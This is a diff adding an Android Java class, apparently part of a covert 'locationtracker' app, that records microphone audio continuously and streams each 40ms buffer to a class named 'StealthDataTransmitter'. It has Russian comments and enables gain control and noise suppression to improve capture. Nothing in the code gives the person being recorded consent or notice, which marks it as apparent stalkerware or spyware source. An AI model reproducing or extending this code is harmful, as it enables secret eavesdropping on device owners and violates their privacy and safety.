@@ -1,0 +1,150 @@
+package com.example.locationtracker;
+
+import android.content.Context;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.MediaRecorder;
+import android.media.audiofx.AutomaticGainControl;
+import android.media.audiofx.NoiseSuppressor;
+import android.os.Build;
+import android.os.Process;
+import android.util.Log;
+
+public class AudioRecorder {
+    private static final String TAG = "AudioRecorder";
+    private static final int SAMPLE_RATE = 16000;
+    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
+    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
+
+    private AudioRecord audioRecord;
+    private Thread recordingThread;
+    private boolean isRecording = false;
+    private StealthDataTransmitter dataTransmitter;
+    private String deviceId;
+    private int bufferSize;
+
+    private AutomaticGainControl agc;
+    private NoiseSuppressor noiseSuppressor;
+
+    public AudioRecorder(Context context, String deviceId, StealthDataTransmitter transmitter) {
+        this.deviceId = deviceId;
+        this.dataTransmitter = transmitter;
+
+        this.bufferSize = AudioRecord.getMinBufferSize(
+                SAMPLE_RATE,
+                CHANNEL_CONFIG,
+                AUDIO_FORMAT
+        ) * 4;
+
+        Log.d(TAG, "AudioRecorder created for device: " + deviceId);
+    }
+
+    public void startRecording() {
+        if (isRecording) return;
+
+        try {
+            audioRecord = new AudioRecord(
+                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+                    SAMPLE_RATE,
+                    CHANNEL_CONFIG,
+                    AUDIO_FORMAT,
+                    bufferSize
+            );
+
+            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
+                Log.e(TAG, "AudioRecord not initialized properly");
+                return;
+            }
+
+            // Включаем AGC (Automatic Gain Control)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
+                try {
+                    agc = AutomaticGainControl.create(audioRecord.getAudioSessionId());
+                    if (agc != null) {
+                        agc.setEnabled(true);
+                        Log.d(TAG, "AGC enabled");
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "AGC not available", e);
+                }
+
+                // Включаем подавление шума
+                try {
+                    noiseSuppressor = NoiseSuppressor.create(audioRecord.getAudioSessionId());
+                    if (noiseSuppressor != null) {
+                        noiseSuppressor.setEnabled(true);
+                        Log.d(TAG, "Noise suppressor enabled");
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "Noise suppressor not available", e);
+                }
+            }
+
+            audioRecord.startRecording();
+            isRecording = true;
+
+            recordingThread = new Thread(() -> {
+                Process.setThreadPriority(Process.THREAD_PRIORITY_URGENT_AUDIO);
+
+                byte[] buffer = new byte[640]; // 40ms для 16kHz
+
+                while (isRecording) {
+                    int bytesRead = audioRecord.read(buffer, 0, buffer.length);
+
+                    if (bytesRead > 0) {
+                        dataTransmitter.sendAudioData(buffer);
+
+                        try {
+                            Thread.sleep(40); // 40ms пауза
+                        } catch (InterruptedException e) {
+                            break;
+                        }
+                    }
+                }
+            });
+
+            recordingThread.start();
+            Log.d(TAG, "Audio recording started - 16kHz with AGC and NS");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start recording", e);
+        }
+    }
+
+    public void stopRecording() {
+        isRecording = false;
+
+        if (recordingThread != null) {
+            try {
+                recordingThread.join(1000);
+            } catch (InterruptedException e) {
+                Log.w(TAG, "Recording thread interrupted", e);
+            }
+            recordingThread = null;
+        }
+
+        if (agc != null) {
+            agc.setEnabled(false);
+            agc.release();
+            agc = null;
+        }
+
+        if (noiseSuppressor != null) {
+            noiseSuppressor.setEnabled(false);
+            noiseSuppressor.release();
+            noiseSuppressor = null;
+        }
+
+        if (audioRecord != null) {
+            try {
+                audioRecord.stop();
+                audioRecord.release();
+            } catch (Exception e) {
+                Log.w(TAG, "Error stopping audio record", e);
+            }
+            audioRecord = null;
+        }
+
+        Log.d(TAG, "Audio recording stopped");
+    }
+}
